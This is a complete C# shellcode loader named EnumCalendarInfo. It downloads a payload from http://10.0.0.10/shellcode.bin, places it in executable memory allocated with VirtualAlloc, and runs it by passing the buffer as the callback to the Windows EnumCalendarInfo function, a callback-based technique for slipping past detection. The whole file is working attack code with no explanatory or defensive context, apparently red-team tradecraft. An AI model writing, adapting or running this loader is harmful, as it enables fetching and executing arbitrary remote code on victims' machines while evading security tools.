using System;
using System.Runtime.InteropServices;

namespace EnumCalendarInfo
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            EnumCalendarInfo(addr, 0x400, 0xFFFFFFFF, 0x00000015);

        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EnumCalendarInfo(IntPtr lpCalInfoEnumProc, int Locale, uint Calendar, int CalType); 

    }
}
